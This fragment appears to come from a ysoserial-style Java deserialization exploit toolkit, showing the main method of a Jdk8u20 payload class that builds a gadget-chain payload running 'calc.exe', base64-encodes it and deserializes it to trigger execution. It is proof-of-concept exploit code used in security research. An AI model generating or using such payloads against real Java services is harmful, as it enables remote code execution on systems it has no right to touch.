...
import ysoserial.payloads.util.Base64Util;
...
public class Jdk8u20 implements ObjectPayload{
    ...
    public static void main(final String[] args) throws Exception {
        byte[] b = new Jdk8u20().getPayload("calc.exe");
        String ser = Base64Util.getBase64Payload_ByBytes(b);
        //Deserializer.deserialize(b);
        System.out.println(ser);
        Base64Util.DeserializeByBase64(ser);
    }
